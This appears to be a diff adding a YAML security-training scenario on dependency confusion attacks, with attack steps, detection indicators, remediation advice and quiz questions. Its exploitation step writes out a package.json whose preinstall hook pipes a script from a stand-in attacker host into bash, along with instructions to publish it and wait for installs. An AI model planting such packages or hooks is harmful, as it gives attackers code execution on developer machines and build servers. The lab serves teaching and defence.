@@ -1,0 +1,102 @@
+# Category: Supply Chain Security
+name: "Dependency Confusion Attack – Hijacking Public Packages"
+id: "supplychain-dependency-confusion-001"
+category: "supply_chain"
+subcategory: "package_management"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit dependency confusion by uploading a malicious package with the
+  same name as an internal private package to a public registry (e.g., npm,
+  PyPI, RubyGems). Because package managers often check public registries
+  first (or if private registry fails), the public malicious version is
+  installed, leading to code execution.
+
+learning_objectives:
+  - Understand how package managers resolve dependency names
+  - Identify internal package names used in an organization
+  - Craft a malicious package with the same name
+  - Publish to public registry and wait for installations
+
+tools:
+  - npm/pip/gem command line
+  - Python (for PyPI)
+  - Node.js (for npm)
+  - curl
+
+prerequisites:
+  - Knowledge of internal package names (from source code, CI logs)
+  - Account on public registry (PyPI, npm, etc.)
+  - Ability to publish packages
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Find internal package names"
+    commands:
+      - "# Look for package.json, requirements.txt, or Gemfile in leaked repos"
+      - "# Or check CI logs for package installation commands"
+    expected_output: "List of package names (e.g., @company/internal-lib, internal‑utils)"
+    detection: "N/A (reconnaissance may not be detected)"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Publish malicious package to public registry"
+    commands:
+      - "# Create package.json (for npm) with same name, high version"
+      - "echo '{\"name\":\"internal-lib\",\"version\":\"999.0.0\",\"scripts\":{\"preinstall\":\"curl attacker.com/backdoor.sh | bash\"}}' > package.json"
+      - "npm publish"
+      - "# For PyPI, create setup.py with malicious setup()"
+    expected_output: "Package published; version > internal version"
+    detection: "Public registry may flag as suspicious; not common"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Wait for developers to install the package"
+    commands:
+      - "# When the organization runs 'npm install', they will pull the public version"
+      - "# The preinstall script executes code on developer machines or build servers"
+    expected_output: "Shell access to build server or developer machine"
+    detection: "Outbound shell connections; CI build failures; unexpected processes"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1195"
+    description: "Supply Chain Compromise"
+  - standard: "OWASP"
+    control: "A06:2021"
+    description: "Vulnerable and Outdated Components"
+
+detection:
+  network_indicators:
+    - "Traffic to public registry for internal‑only package names"
+    - "Outbound connections to attacker domain during build"
+  log_indicators:
+    - "CI logs showing installation from public registry (source: npmjs.com vs private)"
+  endpoint_indicators:
+    - "Unexpected preinstall/postinstall scripts execution"
+
+remediation:
+  immediate:
+    - "Use scoped packages (e.g., @company/pkg) to avoid conflicts"
+    - "Configure package managers to only use private registries (e.g., `npm config set registry`)"
+  long_term:
+    - "Implement package verification (checksums, digital signatures)"
+    - "Use internal mirrors with immutable versions"
+
+variables:
+  internal_package: "internal-lib"
+  attacker_domain: "attacker.com"
+  public_registry: "https://registry.npmjs.org"
+
+assessment_questions:
+  - "Why does dependency confusion work even if the private registry is listed first?"
+  - "How can scoped packages prevent this attack?"
+  - "What is the difference between a dependency confusion attack and a typosquatting attack?"
+
+references:
+  - url: "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
+    title: "Dependency Confusion – Alex Birsan blog"
+  - url: "https://www.imperva.com/blog/dependency-confusion-attack/"
+    title: "Imperva - Dependency Confusion"
